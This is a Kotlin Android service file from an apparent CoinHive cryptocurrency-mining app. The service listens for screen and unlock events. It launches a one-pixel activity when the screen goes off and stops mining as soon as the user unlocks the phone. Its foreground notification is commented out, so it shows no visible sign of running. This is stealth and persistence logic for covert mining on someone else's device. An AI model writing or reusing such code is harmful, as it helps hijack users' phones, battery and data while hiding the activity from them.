package com.cbstudio.coinhiveminer

import android.app.Notification
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.IBinder


/**
 * Created by ImL1s on 2018/6/22.
 * Description:
 */
class CoinHiveMiningService : Service() {

    private val receiver = BroadCastReceiver()

    override fun onCreate() {
        super.onCreate()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val filter = IntentFilter()
        filter.addAction(Intent.ACTION_SCREEN_ON)
        filter.addAction(Intent.ACTION_SCREEN_OFF)
        filter.addAction(Intent.ACTION_USER_PRESENT)
        registerReceiver(receiver, filter)
//        startForeground(1, buildForegroundNotification())
        return START_REDELIVER_INTENT
    }

    private fun buildForegroundNotification(): Notification {
        val builder = Notification.Builder(this)

        builder.setOngoing(true)

        builder.setContentTitle("title")
                .setContentText("Content")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setTicker("ticker")
        builder.setPriority(Notification.PRIORITY_MAX)
        return builder.build()
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    inner class BroadCastReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.action) {
                Intent.ACTION_USER_PRESENT -> {
                    sendBroadcast(Intent(ACTION_STOP_MINING))
                }
                Intent.ACTION_SCREEN_OFF -> {
                    val activityIntent = Intent(this@CoinHiveMiningService, OnePxActivity::class.java)
                    activityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(activityIntent)
                }
            }
        }
    }
}